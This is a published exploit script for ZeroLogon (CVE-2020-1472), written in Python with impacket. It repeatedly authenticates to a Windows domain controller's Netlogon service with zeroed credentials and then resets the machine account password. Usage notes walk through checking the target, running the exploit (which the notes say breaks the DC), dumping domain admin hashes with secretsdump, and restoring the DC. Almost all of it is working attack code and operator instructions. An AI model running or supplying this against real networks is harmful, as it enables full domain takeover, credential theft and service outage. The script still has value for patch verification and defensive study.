# Exploit Title: ZeroLogon - Netlogon Elevation of Privilege
# Date: 2020-10-04
# Exploit Author: West Shepherd
# Vendor Homepage: https://www.microsoft.com
# Version: Microsoft Windows Server 2019, Windows Server 2016, Windows Server 2012 R2, Windows Server 2012, Windows Server 2008 R2
# Tested on: Microsoft Windows Server 2016 Standard x64
# CVE : CVE-2020-1472
# Credit to: Tom Tervoort for discovery and Dirk-Janm for Impacket code
# Sources: https://www.secura.com/pathtoimg.php?id=2055
# Requirements: python3 and impacket 0.9.21+ (tested using this version)
#!/usr/bin/env python3
import hmac, hashlib, struct, sys, socket, time, argparse, logging, codecs
from binascii import hexlify, unhexlify
from subprocess import check_call
from impacket.dcerpc.v5.dtypes import NULL, MAXIMUM_ALLOWED
from impacket.dcerpc.v5 import nrpc, epm, transport
from impacket import crypto, version
from impacket.examples import logger
from Cryptodome.Cipher import AES
from struct import pack, unpack
from impacket.dcerpc.v5.rpcrt import DCERPCException


class Exploit:
    def __init__(
            self,
            name='',
            address='',
            attempts=2000,
            password=''
    ):
        name = name.rstrip('$')
        self.secureChannelType = nrpc.NETLOGON_SECURE_CHANNEL_TYPE\
            .ServerSecureChannel
        self.authenticator = self.getAuthenticator(stamp=0)
        self.clearNewPasswordBlob = b'\x00' * 516
        self.primaryName = ('\\\\%s' % name) + '\x00'
        self.accountName = ('%s$' % name) + '\x00'
        self.computerName = name + '\x00'
        self.clientCredential = b'\x00' * 8
        self.clientChallenge = b'\x00' * 8
        self.negotiateFlags = 0x212fffff
        self.address = address
        self.max = attempts
        self.dce = None
        self.sessionKey = None
        self.clientStoredCredential = None
        self.password = password

    def encodePassword(self, password):
        if isinstance(password, str):
            password = password.encode('utf-8')
        return b'\x00' * (512 - len(password))\
               + password \
               + pack('<L', len(password))

    def getAuthenticator(self, creds=b'\x00' * 8, stamp=10):
        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator['Credential'] = creds
        authenticator['Timestamp'] = stamp
        return authenticator

    def serverReqChallenge(self):
        try:
            binding = epm.hept_map(
              self.address, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp'
            )
            self.dce = transport.DCERPCTransportFactory(binding).get_dce_rpc()
            self.dce.connect()
            self.dce.bind(nrpc.MSRPC_UUID_NRPC)
            return nrpc.hNetrServerReqChallenge(
                self.dce,
                self.primaryName,
                self.computerName,
                self.clientChallenge
            )
        except BaseException as ex:
            self.logError(ex)

    def serverAuthenticate(self):
        try:
            auth = nrpc.hNetrServerAuthenticate3(
                self.dce,
                self.primaryName,
                self.accountName,
                self.secureChannelType,
                self.computerName,
                self.clientCredential,
                self.negotiateFlags
            )
            assert auth['ErrorCode'] == 0
            self.logInfo('successfully authenticated')
            return True
        except nrpc.DCERPCSessionError as ex:
            self.dce = None
            if ex.get_error_code() == 0xc0000022:
                return None
            else:
                self.logFail(ex.get_error_code())
        except BaseException as ex:
            self.dce = None
            self.logFail(ex)
        self.dce = None

    def serverPasswordSet(self):
        try:
            return nrpc.hNetrServerPasswordSet2(
                self.dce,
                self.primaryName,
                self.accountName,
                self.secureChannelType,
                self.computerName,
                self.authenticator,
                self.clearNewPasswordBlob
            )
        except BaseException as ex:
            self.logError(ex)

    def authenticate(self):
        self.logInfo(
            'checking target, attempting to authenticate %d max
attempts' % self.max
        )
        for attempt in range(0, self.max):
            self.logInfo('attempt %d' % attempt)
            self.serverReqChallenge()
            self.serverAuthenticate()
            if self.dce is not None:
                break
        if self.dce:
            return True
        else:
            self.logError('failed to authenticate')

    def exploit(self):
        self.logInfo('attempting password reset')
        reset = self.serverPasswordSet()
        if reset['ErrorCode'] == 0:
            self.logInfo('successfully reset password')
        else:
            self.logError('failed to reset password')
        return self

    def ComputeNetlogonCredentialAES(self, challenge):
        return nrpc.ComputeNetlogonCredentialAES(
            challenge,
            self.sessionKey
        )

    def logInfo(self, message):
        sys.stdout.write("[+] %s\n" % str(message))
        return self

    def logError(self, message):
        sys.stderr.write("[-] error %s\n" % str(message))

    def logFail(self, message):
        sys.stderr.write("[!] failure %s\n" % str(message))
        sys.exit(2)

    def restore(self):
        self.logInfo('attempting to restore password')
        self.clientChallenge = b'12345678'
        try:
            self.primaryName = NULL
            challenge = self.serverReqChallenge()
            self.sessionKey = nrpc.ComputeSessionKeyAES(
                '', self.clientChallenge, challenge['ServerChallenge']
            )
            self.clientCredential = self.ComputeNetlogonCredentialAES(
                self.clientChallenge
            )
            try:
                self.serverAuthenticate()
            except Exception as e:
                if str(e).find('STATUS_DOWNGRADE_DETECTED') < 0:
                    raise
            self.logInfo('restoring password')
            self.clientStoredCredential = pack('<Q', unpack('<Q',
self.clientCredential)[0] + 10)
            self.authenticator = self.getAuthenticator(

creds=self.ComputeNetlogonCredentialAES(self.clientStoredCredential)
            )
            self.clearNewPasswordBlob = self.ComputeNetlogonCredentialAES(
                self.encodePassword(self.password)
            )
            reset = self.serverPasswordSet()
            if reset['ErrorCode'] == 0:
                self.logInfo('successfully restored password')
            else:
                self.logError('failed to restore password')
        except Exception as ex:
            self.logError(ex)
        return self


if __name__ == '__main__':
    info = """
NOTE - Exploitation will break the DC until restored, recommended guidelines:

    1. Check the DC - usually ~300 attempts, use the NETBIOS name not the FQDN:
        cve-2020-1472.py -do check -target <NETBIOS NAME> -ip <IP>

    2. Exploit the DC - this will break the DC until restored:
        cve-2020-1472.py -do exploit <NETBIOS NAME> -ip <IP>

    3. Dump the DC - for the DA hashes, this will not contain the
machine hex-pass:
        secretsdump.py -just-dc -no-pass <NETBIOS NAME>\$@<IP>

    4. Dump the DC again - use the DA hash to get the machines hex-pass:
        secretsdump.py -no-pass -hashes <LMHASH>:<NTHASH> <DOMAIN>/<ADMIN>@<IP>

    5. Restore target - this fixes the DC:
        cve-2020-1472.py -do restore -target <NETBIOS NAME> -ip <IP>
-hex <HEXPASS>
"""
    parser = argparse.ArgumentParser(
        description='CVE-2020-1472 ZeroLogon Exploit - Netlogon
Elevation of Privilege',
        add_help=True
    )
    try:
        parser.add_argument('-do', default='check', action='store',
                            help='What to do (default check):
[check|restore|exploit]')
        parser.add_argument('-target', action='store',
                            help='NETBIOS name of target DC (not the FQDN)')
        parser.add_argument('-ip', action='store',
                            help='IP address of target DC')
        parser.add_argument('-password', default='', action='store',
                            help='The plaintext password to use to
reset the DC')
        parser.add_argument('-hex', default='', action='store',
                            help='The hex password to use to restore
the DC (recommended)')
        parser.add_argument('-max', default=2000, action='store',
                            help='Max attempts to authenticate with
the DC (usually ~300 or less)')

        if len(sys.argv) < 3:
            parser.print_help()
            print(info)
            sys.exit(1)
        options = parser.parse_args()

        if options.do.lower() == 'check':
            Exploit(
                name=options.target,
                address=options.ip,
                attempts=int(options.max)
            ).authenticate()
        elif options.do.lower() == 'exploit':
            exp = Exploit(
                name=options.target,
                address=options.ip,
                attempts=int(options.max)
            )
            if exp.authenticate():
                exp.exploit()
        elif options.do.lower() == 'restore':
            if options.hex != '' and options.password == '':
                options.password = unhexlify(options.hex)
            if options.password != '':
                exp = Exploit(
                    name=options.target,
                    address=options.ip,
                    password=options.password
                ).restore()
        else:
            parser.print_help()

    except Exception as error:
        sys.stderr.write('[-] error in main %s\n' % str(error))